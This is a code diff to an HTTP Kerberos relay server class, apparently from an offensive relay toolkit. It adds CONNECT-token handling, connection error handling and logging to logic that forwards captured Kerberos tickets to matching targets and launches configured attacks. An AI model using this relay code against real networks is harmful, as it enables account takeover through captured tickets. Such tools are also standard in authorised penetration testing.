@@ -42,6 +42,14 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                 LOG.error(str(e))
                 LOG.debug(traceback.format_exc())
 
+        def handle(self):
+            try:
+                HTTPRelayServer.HTTPHandler.handle(self)
+            except ConnectionResetError:
+                LOG.debug('HTTPD: Connection reset by %s' % str(self.client_address[0]))
+            except BrokenPipeError:
+                LOG.debug('HTTPD: Broken pipe from %s' % str(self.client_address[0]))
+
         def getheader(self, header):
             try:
                 return self.headers.getheader(header)
@@ -168,7 +176,9 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                 parsed_target = target
                 if parsed_target.scheme.upper() in self.server.config.attacks:
                     client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
-                    client.initConnection(authdata, self.server.config.dcip)
+                    if not client.initConnection(authdata, self.server.config.dcip):
+                        LOG.error('HTTPD: Connection to %s failed, skipping attack' % parsed_target.netloc)
+                        continue
                     # We have an attack.. go for it
                     attack = self.server.config.attacks[parsed_target.scheme.upper()]
                     client_thread = attack(self.server.config, client.session, self.authUser)
@@ -176,15 +186,34 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                 else:
                     LOG.error('No attack configured for %s', parsed_target.scheme.upper())
 
-        def do_relay(self, authdata):
+        def do_relay(self, authdata_or_msgtype, token=None, proxy=None, content=None):
+            # Called either as do_relay(authdata) from our Kerberos handlers,
+            # or as do_relay(messageType, token, proxy) from parent's do_CONNECT.
+            # In the latter case, parse the Kerberos token ourselves.
+            if isinstance(authdata_or_msgtype, dict):
+                authdata = authdata_or_msgtype
+            else:
+                # Called from parent's do_CONNECT with raw token bytes
+                if token is None or b'NTLMSSP' in token:
+                    LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos (CONNECT)' % self.client_address[0])
+                    return
+                LOG.debug('HTTPD: Kerberos token in CONNECT from %s, parsing' % self.client_address[0])
+                authdata = get_auth_data(token, self.server.config)
             self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
             sclass, host = authdata['service'].split('/')
+            LOG.debug('HTTPD: Relay ticket SPN: %s/%s (user: %s)' % (sclass, host, self.authUser))
             for target in self.server.config.target.originalTargets:
                 parsed_target = target
                 if host.lower() in parsed_target.hostname.lower():
                     # Found a target with the same SPN
+                    LOG.info('HTTPD: Relaying %s ticket for %s to %s' % (sclass, self.authUser, parsed_target.geturl()))
                     client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
-                    if not client.initConnection(authdata, self.server.config.dcip):
+                    try:
+                        if not client.initConnection(authdata, self.server.config.dcip):
+                            LOG.error('HTTPD: Relay to %s failed (auth rejected or target unreachable)' % parsed_target.netloc)
+                            return
+                    except Exception as e:
+                        LOG.error('HTTPD: Error connecting to relay target %s: %s' % (parsed_target.netloc, e))
                         return
                     # We have an attack.. go for it
                     attack = self.server.config.attacks[parsed_target.scheme.upper()]
@@ -192,4 +221,4 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                     client_thread.start()
                     return
             # Still here? Then no target was found matching this SPN
-            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
+            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s (SPN: %s/%s)', host, sclass, host)
